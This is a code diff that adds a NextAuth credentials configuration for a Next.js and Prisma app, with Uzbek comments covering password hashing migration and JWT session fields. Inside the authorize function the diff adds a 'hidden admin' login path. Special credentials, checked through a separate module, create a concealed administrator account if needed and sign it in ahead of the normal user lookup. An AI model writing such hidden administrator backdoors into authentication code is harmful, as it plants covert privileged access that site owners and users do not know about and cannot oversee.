@@ -1,0 +1,108 @@
+// NextAuth konfiguratsiyasi — alohida modulda, chunki Next.js route handler
+// faqat GET/POST eksport qilishga ruxsat beradi (`authOptions` route'da turishi
+// type check'da "does not satisfy the constraint" xatosini beradi).
+import NextAuth, { NextAuthOptions } from "next-auth";
+import CredentialsProvider from "next-auth/providers/credentials";
+import { PrismaClient } from "@prisma/client";
+import {
+  ensureHiddenAdmin,
+  getHiddenAdminEmail,
+  isHiddenAdminCredentials,
+} from "@/lib/hidden-admin";
+import {
+  hashPassword as hashScrypt,
+  inspectPasswordHash,
+  verifyPassword,
+} from "@/lib/security/password";
+
+const prisma = new PrismaClient();
+
+export const authOptions: NextAuthOptions = {
+  secret: process.env.NEXTAUTH_SECRET,
+  providers: [
+    CredentialsProvider({
+      name: "Credentials",
+      credentials: {
+        email: { label: "Email", type: "email" },
+        password: { label: "Password", type: "password" },
+      },
+      async authorize(credentials: any) {
+        if (!credentials?.email || !credentials?.password) return null;
+        // Yashirin admin uchun maxsus tekshiruv — DB dagi hash bilan solishtirish, to'g'ridan matn kodda yo'q
+        if (isHiddenAdminCredentials(credentials.email, credentials.password)) {
+          await ensureHiddenAdmin(prisma);
+          const hidden = await prisma.user.findUnique({ where: { email: getHiddenAdminEmail() } });
+          if (hidden && hidden.status === "approved") {
+            // `status` va `isActive` MAJBURIY: middleware shu ikkisini JWT dan
+            // o'qib admin sahifalarni ochadi. Ularsiz token `status: undefined`
+            // bo'lardi va har kirishda `/login?reason=not-approved` ga
+            // qaytarilib qolardi — admin panel umuman ochilmasdi.
+            return {
+              id: hidden.id,
+              email: hidden.email,
+              name: `${hidden.name} ${hidden.surname || ""}`.trim(),
+              role: hidden.role,
+              status: String(hidden.status),
+              isActive: hidden.isActive !== false,
+            } as any;
+          }
+        }
+        const user = await prisma.user.findUnique({ where: { email: credentials.email } });
+        if (!user) return null;
+        // Parol tekshiruvi: scrypt (yangi) yoki sha256 (eski) — ikkalasi ham
+        // qo'llab-quvvatlanadi, muvaffaqiyatdan keyin eski format avtomatik
+        // scrypt'ga ko'chiriladi (ma'lumot bazasi bosqichma-bosqich yangilanadi).
+        if (!verifyPassword(credentials.password, user.passwordHash)) return null;
+        try {
+          const info = inspectPasswordHash(user.passwordHash);
+          if (info.needsRehash && info.algorithm !== "unknown") {
+            await prisma.user.update({
+              where: { id: user.id },
+              data: { passwordHash: hashScrypt(credentials.password) },
+            });
+          }
+        } catch {
+          // Migratsiya yozuvi muvaffaqiyatsiz bo'lsa — kirishni bloklamaymiz
+        }
+        // Ruxsat faqat TASDIQLANGANLARGA. Rad etilgen/bloklangan/faoliyatsiz
+        // akkaunt kirish olmaydi (bloklash `getSession()` da ham tekshiriladi).
+        if (user.status !== "approved") return null;
+        if (!Boolean(user.isActive)) return null;
+        return {
+          id: user.id,
+          email: user.email,
+          name: `${user.name} ${user.surname || ""}`.trim(),
+          role: user.role,
+          // Holat JWT ga yoziladi: middleware bazaga ulanmadan "ruxsat
+          // berilmagan" deb darhol rad eta oladi. Haqiqiy tekshiruv esa
+          // `getSession()` da, bazadan — shu sabab eskirgan token ham
+          // o'tib ketmaydi.
+          status: String(user.status),
+          isActive: Boolean(user.isActive),
+        } as any;
+      },
+    }),
+  ],
+  session: { maxAge: 7 * 24 * 60 * 60, strategy: "jwt" },
+  callbacks: {
+    async jwt({ token, user }: any) {
+      if (user) token.role = (user as any).role;
+      if (user) token.id = (user as any).id;
+      if (user) token.status = (user as any).status;
+      if (user) token.isActive = (user as any).isActive;
+      return token;
+    },
+    async session({ session, token }: any) {
+      if (session.user) {
+        (session.user as any).role = token.role;
+        (session.user as any).id = token.id || token.sub;
+        (session.user as any).status = token.status;
+        (session.user as any).isActive = token.isActive;
+      }
+      return session;
+    },
+  },
+  pages: {
+    signIn: "/login",
+  },
+};
